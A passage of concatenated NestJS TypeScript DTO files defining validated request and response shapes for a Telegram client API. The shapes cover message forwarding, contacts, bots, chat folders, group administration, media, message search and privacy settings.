@ApiProperty({ description: 'Message IDs to forward', type: [Number] })\r\n  @IsArray()\r\n  @ArrayMinSize(1, { message: 'At least one message ID is required' })\r\n  @ArrayMaxSize(100, { message: 'Cannot forward more than 100 messages at once' })\r\n  @IsNumber({}, { each: true })\r\n  @Transform(({ value }) => Array.isArray(value) ? value.map(Number) : value)\r\n  messageIds: number[];\r\n}","import { ApiProperty } from '@nestjs/swagger';\n\nexport class ConnectionStatsDto {\n    @ApiProperty({ description: 'Total number of connections' })\n    total: number;\n\n    @ApiProperty({ description: 'Number of connected clients' })\n    connected: number;\n\n    @ApiProperty({ description: 'Number of connecting clients' })\n    connecting: number;\n\n    @ApiProperty({ description: 'Number of disconnecting clients' })\n    disconnecting: number;\n\n    @ApiProperty({ description: 'Number of clients in error state' })\n    error: number;\n}\n\nexport class ConnectionStatusDto {\n    @ApiProperty({ description: 'Connection state of the client', enum: ['connecting', 'connected', 'disconnecting', 'disconnected', 'error'] })\n    state: string;\n\n    @ApiProperty({ description: 'Whether auto disconnect is enabled' })\n    autoDisconnect: boolean;\n\n    @ApiProperty({ description: 'When the connection was last used', type: 'number' })\n    lastUsed: number;\n\n    @ApiProperty({ description: 'Number of connection attempts', type: 'number' })\n    connectionAttempts: number;\n\n    @ApiProperty({ description: 'Last error message if any', required: false })\n    lastError?: string;\n}\n\nexport class GetClientOptionsDto {\n    @ApiProperty({ description: 'Whether to auto disconnect the client after period of inactivity', required: false, default: true })\n    autoDisconnect?: boolean;\n\n    @ApiProperty({ description: 'Whether to use event handler', required: false, default: true })\n    handler?: boolean;\n\n    @ApiProperty({ description: 'Connection timeout in milliseconds', required: false, default: 30000 })\n    timeout?: number;\n}\n","import { IsString, IsOptional, IsArray, IsBoolean, IsEnum } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport type ExportFormat = 'vcard' | 'csv';\r\n\r\nexport class ContactGroupDto {\r\n  @ApiProperty({ description: 'Name of the contact group' })\r\n  @IsString()\r\n  name: string;\r\n\r\n  @ApiProperty({ description: 'User IDs to include in the group', type: [String] })\r\n  @IsArray()\r\n  @IsString({ each: true })\r\n  userIds: string[];\r\n\r\n  @ApiProperty({ description: 'Optional description for the group' })\r\n  @IsOptional()\r\n  @IsString()\r\n  description?: string;\r\n}\r\n\r\nexport class ContactBlockListDto {\r\n  @ApiProperty({ description: 'User IDs to block/unblock', type: [String] })\r\n  @IsArray()\r\n  @IsString({ each: true })\r\n  userIds: string[];\r\n\r\n  @ApiProperty({ description: 'Whether to block or unblock the users' })\r\n  @IsBoolean()\r\n  block: boolean;\r\n}\r\n\r\nexport class ContactExportImportDto {\r\n  @ApiProperty({ enum: ['vcard', 'csv'], description: 'Export format type' })\r\n  @IsEnum(['vcard', 'csv'] as const)\r\n  format: ExportFormat;\r\n\r\n  @ApiProperty({ description: 'Whether to include blocked contacts', required: false, default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  includeBlocked = false;\r\n}\r\n\r\nexport class ContactImportDto {\r\n  @ApiProperty({ description: 'Contacts to import', type: [Object] })\r\n  @IsArray()\r\n  contacts: Array<{\r\n    firstName: string;\r\n    lastName?: string;\r\n    phone: string;\r\n  }>;\r\n}\r\n\r\nexport class AddContactsDto {\r\n  @ApiProperty({ description: 'Phone numbers to add', type: [String] })\r\n  @IsArray()\r\n  @IsString({ each: true })\r\n  phoneNumbers: string[];\r\n\r\n  @ApiProperty({ description: 'Name prefix to use for added contacts' })\r\n  @IsString()\r\n  prefix: string;\r\n}","import { ApiProperty } from '@nestjs/swagger';\nimport { IsNotEmpty, IsString, IsOptional, MaxLength } from 'class-validator';\n\nexport class CreateBotDto {\n    @ApiProperty({\n        description: 'Name of the bot (required)',\n        example: 'MyAwesomeBot'\n    })\n    @IsNotEmpty()\n    @IsString()\n    @MaxLength(64)\n    name: string;\n\n    @ApiProperty({\n        description: 'Username for the bot (required)',\n        example: 'my_awesome_bot'\n    })\n    @IsNotEmpty()\n    @IsString()\n    @MaxLength(32)\n    username: string;\n\n    @ApiProperty({\n        description: 'Description of what your bot can do',\n        example: 'This bot helps you manage your tasks',\n        required: false\n    })\n    @IsOptional()\n    @IsString()\n    @MaxLength(512)\n    description?: string;\n\n    @ApiProperty({\n        description: 'What the bot can be used for',\n        example: 'Task Management, Reminders, Notes',\n        required: false\n    })\n    @IsOptional()\n    @IsString()\n    @MaxLength(512)\n    aboutText?: string;\n\n    @ApiProperty({\n        description: 'URL to the bot\\'s profile photo',\n        example: 'https://example.com/bot-photo.jpg',\n        required: false\n    })\n    @IsOptional()\n    @IsString()\n    profilePhotoUrl?: string;\n}\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsArray, IsBoolean, IsNotEmpty, IsOptional, IsString } from 'class-validator';\r\n\r\nexport class CreateChatFolderDto {\r\n    @ApiProperty({ description: 'Name of the chat folder' })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    name: string;\r\n\r\n    @ApiProperty({ description: 'List of chat IDs to include in the folder' })\r\n    @IsArray()\r\n    @IsNotEmpty()\r\n    includedChats: string[];\r\n\r\n    @ApiProperty({ description: 'List of chat IDs to exclude from the folder', required: false })\r\n    @IsArray()\r\n    @IsOptional()\r\n    excludedChats?: string[];\r\n\r\n    @ApiProperty({ description: 'Include contacts in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeContacts?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include non-contacts in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeNonContacts?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include groups in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeGroups?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include broadcast channels in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeBroadcasts?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include bots in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeBots?: boolean;\r\n\r\n    @ApiProperty({ description: 'Exclude muted chats from the folder', required: false, default: false })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    excludeMuted?: boolean;\r\n\r\n    @ApiProperty({ description: 'Exclude read chats from the folder', required: false, default: false })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    excludeRead?: boolean;\r\n\r\n    @ApiProperty({ description: 'Exclude archived chats from the folder', required: false, default: false })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    excludeArchived?: boolean;\r\n}","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsBoolean, IsInt, IsOptional, IsString } from 'class-validator';\n\nexport class DeleteHistoryDto {\n  @ApiProperty({\n    description: 'Username or peer ID of the chat whose history you want to delete',\n  })\n  @IsString()\n  peer: string;\n\n  @ApiPropertyOptional({\n    description: 'Deletes all messages with IDs less than or equal to this value',\n  })\n  @IsOptional()\n  @IsInt()\n  maxId?: number;\n\n  @ApiPropertyOptional({\n    description: 'If true, clears the history only for the current user without deleting for others',\n    default: true,\n  })\n  @IsOptional()\n  @IsBoolean()\n  justClear: boolean = true;\n\n  @ApiPropertyOptional({\n    description: 'If true, deletes the message history for all participants (if permitted)',\n    default: false,\n  })\n  @IsOptional()\n  @IsBoolean()\n  revoke: boolean = false;\n\n  @ApiPropertyOptional({\n    description: 'Minimum date (UNIX timestamp) for messages to be deleted',\n  })\n  @IsOptional()\n  @IsInt()\n  minDate?: number;\n\n  @ApiPropertyOptional({\n    description: 'Maximum date (UNIX timestamp) for messages to be deleted',\n  })\n  @IsOptional()\n  @IsInt()\n  maxDate?: number;\n}\n","import { IsString, IsOptional, IsNumber, IsBoolean, IsObject, ValidateNested, IsNotEmpty, IsEnum, IsDateString } from 'class-validator';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Type, Transform } from 'class-transformer';\r\n\r\nexport enum AdminPermission {\r\n  CHANGE_INFO = 'changeInfo',\r\n  POST_MESSAGES = 'postMessages',\r\n  EDIT_MESSAGES = 'editMessages',\r\n  DELETE_MESSAGES = 'deleteMessages',\r\n  BAN_USERS = 'banUsers',\r\n  INVITE_USERS = 'inviteUsers',\r\n  PIN_MESSAGES = 'pinMessages',\r\n  ADD_ADMINS = 'addAdmins',\r\n  ANONYMOUS = 'anonymous',\r\n  MANAGE_CALL = 'manageCall'\r\n}\r\n\r\nexport class AdminPermissionsDto {\r\n  @ApiProperty({ description: 'Permission to change group info', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  changeInfo?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to post messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  postMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to edit messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  editMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to delete messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  deleteMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to ban users', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  banUsers?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to invite users', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  inviteUsers?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to pin messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  pinMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to add new admins', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  addAdmins?: boolean = false;\r\n\r\n  @ApiProperty({ description: 'Permission to remain anonymous', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  anonymous?: boolean = false;\r\n\r\n  @ApiProperty({ description: 'Permission to manage voice chats', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  manageCall?: boolean = true;\r\n}\r\n\r\n// Base class for group operations\r\nexport class BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Group ID' })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  groupId: string;\r\n}\r\n\r\nexport class GroupMemberOperationDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Array of user IDs', type: [String] })\r\n  @IsString({ each: true })\r\n  members: string[];\r\n}\r\n\r\nexport class AdminOperationDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'User ID to promote/demote' })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  userId: string;\r\n\r\n  @ApiProperty({ description: 'Whether to promote or demote', required: true })\r\n  @IsBoolean()\r\n  isPromote: boolean;\r\n\r\n  @ApiProperty({ description: 'Admin permissions', required: false })\r\n  @IsOptional()\r\n  @ValidateNested()\r\n  @Type(() => AdminPermissionsDto)\r\n  permissions?: AdminPermissionsDto;\r\n\r\n  @ApiProperty({ description: 'Custom admin rank/title', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  rank?: string;\r\n}\r\n\r\nexport class GroupSettingsDto extends BaseGroupOperationDto {\r\n  @ApiPropertyOptional({ description: 'Group title', required: false })\r\n  @IsString()\r\n  @IsOptional()\r\n  title?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Group username', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  username?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Group description', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  description?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Address or location of the group', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  address?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Slow mode delay in seconds', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  slowMode?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is a megagroup', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  megagroup?: boolean = true;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is for import', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  forImport?: boolean = false;\r\n\r\n  @ApiPropertyOptional({ description: 'Member restrictions', required: false })\r\n  @IsOptional()\r\n  @IsObject()\r\n  memberRestrictions?: {\r\n    sendMessages?: boolean;\r\n    sendMedia?: boolean;\r\n    sendStickers?: boolean;\r\n    sendGifs?: boolean;\r\n    sendGames?: boolean;\r\n    sendInline?: boolean;\r\n    embedLinks?: boolean;\r\n  };\r\n}\r\n\r\nexport class ChatCleanupDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Chat ID to clean up' })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  chatId: string;\r\n  @ApiProperty({ description: 'Delete messages before this date', required: false })\r\n  @IsOptional()\r\n  @IsDateString()\r\n  @Transform(({ value }) => value ? new Date(value) : undefined)\r\n  beforeDate?: Date;\r\n\r\n  @ApiProperty({ description: 'Only delete media messages', required: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  onlyMedia?: boolean;\r\n\r\n  @ApiProperty({ description: 'Exclude pinned messages', required: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  excludePinned?: boolean;\r\n}\r\n\r\nexport class createGroupDto {\r\n  @ApiProperty({ description: 'Group title', required: true })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  title: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Group description', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  about?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Address or location of the group', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  address?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Slow mode delay in seconds', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  slowMode?: number = 0;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is a megagroup', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  megagroup?: boolean = true;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is a broadcast', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  broadcast?: boolean = true;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is for import', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  forImport?: boolean = false;\r\n\r\n  @ApiPropertyOptional({ description: 'Member restrictions', required: false })\r\n  @IsOptional()\r\n  @IsObject()\r\n  memberRestrictions?: {\r\n    sendMessages?: boolean;\r\n    sendMedia?: boolean;\r\n    sendStickers?: boolean;\r\n    sendGifs?: boolean;\r\n    sendGames?: boolean;\r\n    sendInline?: boolean;\r\n    embedLinks?: boolean;\r\n  };\r\n}\r\n","// Core Types and Interfaces\r\nexport * from '../../../interfaces/telegram';\r\n\r\n// Base DTOs\r\nexport * from './batch-operations.dto';\r\nexport * from './media-operations.dto';\r\nexport * from './schedule-operations.dto';\r\nexport * from './metadata-operations.dto';\r\nexport * from './group-operations.dto';\r\nexport * from './contact-management.dto';\r\nexport * from './profile-settings.dto';\r\nexport * from './view-once-media.dto';\r\nexport * from './create-bot.dto';\r\n\r\n// Type Re-exports\r\nexport { BatchOperationType } from './batch-operations.dto';\r\nexport { MediaType } from './media-operations.dto';\r\nexport { AdminPermission } from './group-operations.dto';\r\nexport { ExportFormat } from './contact-management.dto';\r\n","import { IsString, IsOptional, IsNumber, IsArray, IsEnum, IsUrl, ValidateNested } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform, Type } from 'class-transformer';\r\n\r\nexport enum MediaType {\r\n  PHOTO = 'photo',\r\n  VIDEO = 'video',\r\n  DOCUMENT = 'document',\r\n  VOICE = 'voice',\r\n  AUDIO = 'audio'\r\n}\r\n\r\n// Base class for media operations\r\nexport class BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'Chat ID for media operation' })\r\n  @IsString()\r\n  chatId: string;\r\n}\r\n\r\nexport class MediaSearchDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'Media types to include', enum: MediaType, isArray: true })\r\n  @IsArray()\r\n  @IsEnum(MediaType, { each: true })\r\n  types: MediaType[];\r\n\r\n  @ApiProperty({ description: 'Message offset', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  @Transform(({ value }) => parseInt(value))\r\n  offset?: number;\r\n\r\n  @ApiProperty({ description: 'Items per page', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  @Transform(({ value }) => parseInt(value))\r\n  limit?: number = 50;\r\n}\r\n\r\nexport class MediaFilterDto extends MediaSearchDto {\r\n  @ApiProperty({ description: 'Start date for filtering', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  @Transform(({ value }) => value ? new Date(value).toISOString() : undefined)\r\n  startDate?: string;\r\n\r\n  @ApiProperty({ description: 'End date for filtering', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  @Transform(({ value }) => value ? new Date(value).toISOString() : undefined)\r\n  endDate?: string;\r\n}\r\n\r\nexport class SendMediaDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'URL of the media file' })\r\n  @IsString()\r\n  @IsUrl()\r\n  url: string;\r\n\r\n  @ApiProperty({ description: 'Caption for the media', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  caption?: string;\r\n\r\n  @ApiProperty({ description: 'Filename for the media' })\r\n  @IsString()\r\n  filename: string;\r\n\r\n  @ApiProperty({ description: 'Type of media', enum: MediaType })\r\n  @IsEnum(MediaType)\r\n  type: MediaType;\r\n}\r\n\r\nexport class MediaAlbumItemDto {\r\n  @ApiProperty({ description: 'URL of the media file' })\r\n  @IsString()\r\n  @IsUrl()\r\n  url: string;\r\n\r\n  @ApiProperty({ description: 'Type of media', enum: MediaType })\r\n  @IsEnum(MediaType)\r\n  type: MediaType;\r\n\r\n  @ApiProperty({ description: 'Caption for the media item', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  caption?: string;\r\n}\r\n\r\nexport class SendMediaAlbumDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'Array of media items', type: [MediaAlbumItemDto] })\r\n  @IsArray()\r\n  @ValidateNested({ each: true })\r\n  @Type(() => MediaAlbumItemDto)\r\n  media: MediaAlbumItemDto[];\r\n}\r\n\r\nexport class VoiceMessageDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'URL of the voice message file' })\r\n  @IsString()\r\n  @IsUrl()\r\n  url: string;\r\n\r\n  @ApiProperty({ description: 'Duration of voice message in seconds', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  duration?: number;\r\n\r\n  @ApiProperty({ description: 'Caption for the voice message', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  caption?: string;\r\n}","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Type } from 'class-transformer';\r\nimport {\r\n  IsString,\r\n  IsOptional,\r\n  IsArray,\r\n  IsNumber,\r\n  IsEnum,\r\n  IsDate,\r\n  Min,\r\n  Max,\r\n  IsInt,\r\n  ValidateNested,\r\n  ArrayMinSize,\r\n  ArrayMaxSize\r\n} from 'class-validator';\r\n\r\n/**\r\n * Enum for message media types that can be searched\r\n */\r\nexport enum MessageMediaType {\r\n  ALL = 'all',\r\n  TEXT = 'text',\r\n  PHOTO = 'photo',\r\n  VIDEO = 'video',\r\n  VOICE = 'voice',\r\n  DOCUMENT = 'document',\r\n  ROUND_VIDEO = 'roundVideo',\r\n  ROUND_VOICE = 'roundVoice',\r\n  STICKER = 'sticker',\r\n  ANIMATION = 'animation',\r\n  CONTACT = 'contact',\r\n  MUSIC = 'music',\r\n  CHAT_PHOTO = 'chatPhoto',\r\n}\r\n\r\n/**\r\n * Enum for search scope\r\n */\r\nexport enum SearchScope {\r\n  CHAT = 'chat',\r\n  GLOBAL = 'global'\r\n}\r\n\r\n/**\r\n * DTO for search messages request\r\n */\r\nexport class SearchMessagesDto {\r\n  @ApiPropertyOptional({\r\n    description: 'Chat ID to search in (required for chat-specific search)',\r\n  })\r\n  @IsString()\r\n  @IsOptional()\r\n  chatId?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Search query string',\r\n  })\r\n  @IsString()\r\n  @IsOptional()\r\n  query?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Filter by multiple types options',\r\n    isArray: true,\r\n    enum: MessageMediaType,\r\n    example: [MessageMediaType.TEXT, MessageMediaType.PHOTO],\r\n    default: [MessageMediaType.ALL, MessageMediaType.TEXT, MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.VOICE, MessageMediaType.DOCUMENT, MessageMediaType.ROUND_VIDEO, MessageMediaType.ROUND_VOICE, MessageMediaType.STICKER, MessageMediaType.ANIMATION, MessageMediaType.CONTACT, MessageMediaType.MUSIC, MessageMediaType.CHAT_PHOTO],\r\n  })\r\n  @IsOptional()\r\n  @IsArray()\r\n  @IsEnum(MessageMediaType, { each: true })\r\n  @Type(() => String)\r\n  types?: MessageMediaType[];\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Minimum message ID for filtering',\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  @IsOptional()\r\n  minId?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Maximum message ID for filtering',\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  @IsOptional()\r\n  maxId?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Maximum number of messages to retrieve',\r\n    minimum: 1,\r\n    maximum: 500,\r\n  })\r\n  @IsInt()\r\n  @Min(1)\r\n  @Max(500)\r\n  @IsOptional()\r\n  limit?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Offset ID for pagination',\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  @IsOptional()\r\n  offsetId?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Offset date as Unix timestamp',\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  @IsOptional()\r\n  offsetDate?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Start date for filtering messages by date range',\r\n  })\r\n  @Type(() => Date)\r\n  @IsDate()\r\n  @IsOptional()\r\n  startDate?: Date;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'End date for filtering messages by date range',\r\n  })\r\n  @Type(() => Date)\r\n  @IsDate()\r\n  @IsOptional()\r\n  endDate?: Date;\r\n}\r\n\r\n/**\r\n * Interface for message search results by type\r\n */\r\nexport class MessageTypeResult {\r\n  @ApiProperty({\r\n    description: 'Array of message IDs matching the search criteria',\r\n    type: [Number],\r\n    example: [1001, 1005, 1010]\r\n  })\r\n  @IsArray()\r\n  @IsInt({ each: true })\r\n  messages: number[];\r\n\r\n  @ApiProperty({\r\n    description: 'Total count of messages matching the search criteria',\r\n    example: 3\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  total: number;\r\n\r\n  data?: any\r\n}\r\n\r\n/**\r\n * DTO for search messages response\r\n */\r\nexport class SearchMessagesResponseDto {\r\n  @ApiPropertyOptional({\r\n    description: 'All message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  all?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Text message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  text?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Photo message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  photo?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Video message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  video?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Voice message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  voice?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Document message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  document?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Round video message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  roundVideo?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Round voice message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  roundVoice?: MessageTypeResult;\r\n}","import { IsString, IsNumber, IsOptional, IsArray, IsBoolean, Min, Max, Length, ArrayMinSize, ArrayMaxSize, IsNotEmpty, IsEnum } from 'class-validator';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Transform, Type } from 'class-transformer';\r\n\r\nexport enum MetadataType {\r\n    PHOTO = 'photo',\r\n    VIDEO = 'video',\r\n    DOCUMENT = 'document'\r\n}\r\n\r\nexport class MediaMetadataDto {\r\n    @ApiProperty({ description: 'Chat ID to get metadata from' })\r\n    @IsString()\r\n    chatId: string;\r\n\r\n    @ApiProperty({ description: 'Message offset', required: false })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    offset?: number;\r\n\r\n    @ApiProperty({ description: 'Maximum number of items', required: false })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    limit?: number = 50;\r\n}\r\n\r\nexport class DialogsQueryDto {\r\n    @ApiPropertyOptional({ description: 'Number of dialogs to fetch', required: false, type: Number, minimum: 1, maximum: 1000 })\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    @IsNumber()\r\n    @Min(1)\r\n    @Max(1000)\r\n    limit: number = 100;\r\n\r\n    @ApiPropertyOptional({ description: 'Dialog offset', required: false, type: Number, minimum: 0 })\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    @IsNumber()\r\n    @Min(0)\r\n    offsetId?: number = 0;\r\n\r\n    @ApiPropertyOptional({ description: 'Include archived chats', required: false, type: Boolean })\r\n    @IsOptional()\r\n    @Transform(({ value }) => {\r\n        if (value === 'true') return true;\r\n        if (value === 'false') return false;\r\n        return value;\r\n    })\r\n    @IsBoolean()\r\n    archived?: boolean = false;\r\n}\r\n\r\nexport class BulkMessageOperationDto {\r\n    @ApiProperty({ description: 'Source chat ID', type: String, minLength: 1, maxLength: 255 })\r\n    @IsString()\r\n    fromChatId!: string;\r\n\r\n    @ApiProperty({ description: 'Target chat ID', type: String, minLength: 1, maxLength: 255 })\r\n    @IsString()\r\n    toChatId!: string;\r\n\r\n    @ApiProperty({ description: 'Message IDs to operate on', type: [Number], minItems: 1, maxItems: 100 })\r\n    @Transform(({ value }) => Array.isArray(value) ? value.map(Number) : value)\r\n    messageIds!: number[];\r\n}","import { IsString, IsOptional, IsEnum, IsBoolean } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { PrivacyLevel, PrivacyLevelEnum } from '../../../interfaces/telegram';\r\n\r\nexport class UpdateProfileDto {\r\n  @ApiProperty({ description: 'First name' })\r\n  @IsString()\r\n  firstName: string;\r\n\r\n  @ApiProperty({ description: 'About/bio information', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  about?: string;\r\n}\r\n\r\nexport class PrivacySettingsDto {\r\n  @ApiProperty({ description: 'Phone number visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  phoneNumber?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Last seen visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  lastSeen?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Profile photos visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  profilePhotos?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Message forwards visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  forwards?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Calls privacy', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  calls?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Group chats privacy', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  groups?: PrivacyLevel;\r\n}\r\n\r\nexport class SecuritySettingsDto {\r\n  @ApiProperty({ description: 'Enable/disable two-factor authentication' })\r\n  @IsBoolean()\r\n  twoFactorAuth: boolean;\r\n\r\n  @ApiProperty({ description: 'Active sessions limit', required: false })\r\n  @IsOptional()\r\n  @IsEnum([1, 2, 3, 4, 5])\r\n  activeSessionsLimit?: number;\r\n}\r\n\r\nexport class ProfilePhotoDto {\r\n  @ApiProperty({ description: 'Name/identifier of the photo to set' })\r\n  @IsString()\r\n  name: string;\r\n}","import { IsString, IsOptional, IsNumber, IsBoolean, IsDateString } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\nimport { BaseBatchItemDto } from 